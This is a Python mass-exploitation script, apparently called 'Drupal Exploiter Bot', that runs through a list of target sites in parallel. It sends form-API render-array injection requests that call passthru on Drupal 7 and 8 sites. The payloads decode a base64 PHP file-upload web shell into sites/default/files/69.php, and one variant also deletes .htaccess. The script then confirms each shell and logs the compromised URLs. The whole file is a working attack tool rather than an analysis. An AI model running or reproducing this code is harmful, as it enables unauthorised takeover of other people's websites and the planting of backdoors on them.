import requests, sys, re, os, urllib
from multiprocessing.dummy import Pool
from base64 import b64encode, b64decode
from zlib import compress, decompress
from platform import system
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init


init(autoreset=True)
init(autoreset=True)
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

try:
	os.mkdir("R3zlt")
except:
	pass
	
if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")
	
print("="*60)
print("[+] Drupal Exploiter Bot\n[+] Coded by Raiz0WorM\n[+] Updated by NinjaCR3")
print("="*60)
print("\n\n")

try:
    with open(sys.argv[1], 'r') as readlist:
        lists = readlist.read().splitlines()
except IOError:
    pass
lists = list((lists))


def Drupal7(url):
    try:
        headers = {'User-Agent': 'Mozilla 5.0'}
        getd = {'q': 'user/password', 'name[#post_render][]': 'passthru',
                'name[#markup]': "echo IDw/cGhwIC8qOTc2NDg5NTA4OTc2NDg5NTA4Ki8gPz48P3BocCAvKjQ1NzU2MzY0MzQ1NzU2MzY0MyovID8+PD9waHAKZWNobyAiUmFpejBXb3JNIjsKZWNobyAiPGJyPiIucGhwX3VuYW1lKCkuIjxicj4iOwplY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPgo8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0nemInPjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3VwbG9hZCcgdmFsdWU9J3VwbG9hZCc+CjwvZm9ybT4iOwppZigkX1BPU1RbJ3VwbG9hZCddKSB7CiAgaWYoQGNvcHkoJF9GSUxFU1snemInXVsndG1wX25hbWUnXSwgJF9GSUxFU1snemInXVsnbmFtZSddKSkgewogIGVjaG8gImVYcGxvaXRpbmcgRG9uZSI7CiAgfSBlbHNlIHsKICBlY2hvICJGYWlsZWQgdG8gVXBsb2FkLiI7CiAgfQp9Cj8+ | base64 -d | tee sites/default/files/69.php",
                'name[#type]': 'markup'}
        postd = {'form_id': 'user_pass', '_triggering_element_name': 'name'}
        injectone = requests.post(url, data=postd, params=getd, headers=headers)
        token = re.findall('name="form_build_id" value="(.*?)" />', injectone.content)
        geti = {'q': 'file/ajax/name/#value/' + token[0]}
        posti = {'form_build_id': token[0]}
        injectotwo = requests.post(url, data=posti, params=geti, headers=headers)
        verficationone = requests.get(url + "/sites/default/files/69.php", headers=headers)
        if 'Raiz0WorM' in verficationone.content:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Private'.format(
                fw, sb) + ' --->' + '{}{} [Shell Uploaded Successfully ##!]'.format(fg, sb)
            open('R3zlt/1.txt', 'a').write(url + "/sites/default/files/69.php" + '\n')
        else:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Private'.format(
                fw, sb) + ' --->' + '{}{} Not VulN'.format(fr, sb)
    except:
        pass


def Drupal8(url):
    try:
        headers = {'User-Agent': 'Mozilla 5.0'}
        postdd = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'passthru',
                  'mail[#type]': 'markup',
                  'mail[#markup]': "echo IDw/cGhwIC8qOTc2NDg5NTA4OTc2NDg5NTA4Ki8gPz48P3BocCAvKjQ1NzU2MzY0MzQ1NzU2MzY0MyovID8+PD9waHAKZWNobyAiUmFpejBXb3JNIjsKZWNobyAiPGJyPiIucGhwX3VuYW1lKCkuIjxicj4iOwplY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPgo8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0nemInPjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3VwbG9hZCcgdmFsdWU9J3VwbG9hZCc+CjwvZm9ybT4iOwppZigkX1BPU1RbJ3VwbG9hZCddKSB7CiAgaWYoQGNvcHkoJF9GSUxFU1snemInXVsndG1wX25hbWUnXSwgJF9GSUxFU1snemInXVsnbmFtZSddKSkgewogIGVjaG8gImVYcGxvaXRpbmcgRG9uZSI7CiAgfSBlbHNlIHsKICBlY2hvICJGYWlsZWQgdG8gVXBsb2FkLiI7CiAgfQp9Cj8+ | base64 -d | tee sites/default/files/69.php"}
        injctone = requests.post(
            url + "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
            data=postdd, headers=headers)
        verficationtwo = requests.get(url + "/sites/default/files/69.php", headers=headers)
        if 'Raiz0WorM' in verficationtwo.content:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Private'.format(
                fw, sb) + ' --->' + '{}{} [Shell Uploaded Successfully !]'.format(fg, sb)
            open('R3zlt/2.txt', 'a').write(url + "/sites/default/files/69.php" + '\n')
        else:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Private'.format(
                fw, sb) + ' --->' + '{}{} Not VulN'.format(fr, sb)
    except:
        pass


def Drupal9(url):
    try:
        headers = {'User-Agent': 'Mozilla 5.0'}
        postdd = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'passthru',
                  'mail[#type]': 'markup',
                  'mail[#markup]': "echo IDw/cGhwIC8qOTc2NDg5NTA4OTc2NDg5NTA4Ki8gPz48P3BocCAvKjQ1NzU2MzY0MzQ1NzU2MzY0MyovID8+PD9waHAKZWNobyAiUmFpejBXb3JNIjsKZWNobyAiPGJyPiIucGhwX3VuYW1lKCkuIjxicj4iOwplY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPgo8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0nemInPjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3VwbG9hZCcgdmFsdWU9J3VwbG9hZCc+CjwvZm9ybT4iOwppZigkX1BPU1RbJ3VwbG9hZCddKSB7CiAgaWYoQGNvcHkoJF9GSUxFU1snemInXVsndG1wX25hbWUnXSwgJF9GSUxFU1snemInXVsnbmFtZSddKSkgewogIGVjaG8gImVYcGxvaXRpbmcgRG9uZSI7CiAgfSBlbHNlIHsKICBlY2hvICJGYWlsZWQgdG8gVXBsb2FkLiI7CiAgfQp9Cj8+ | base64 -d | tee sites/default/files/69.php | rm -rf sites/default/files/.htaccess"}
        injctone = requests.post(
            url + "/user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
            data=postdd, headers=headers)
        verficationtwo = requests.get(url + "/sites/default/files/69.php", headers=headers)
        if 'Raiz0WorM' in verficationtwo.content:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Private'.format(
                fw, sb) + ' --->' + '{}{} [Shell Uploaded Successfully !]'.format(fg, sb)
            open('R3zlt/3.txt', 'a').write(url + "/sites/default/files/69.php" + '\n')
        else:
            print ('{}{}' + (url)).format(fc, sb) + '{}{}|'.format(fr, sb) + '{}{} Private'.format(
                fw, sb) + ' --->' + '{}{} Not VulN'.format(fr, sb)
    except:
        pass

def Exploit(url):
    try:
        Drupal7(url)
        Drupal8(url)
        Drupal9(url)
    except:
        pass


def Main():
    try:
        pp = Pool(20)
        pr = pp.map(Exploit, lists)
    except:
        pass


if __name__ == '__main__':
    Main()
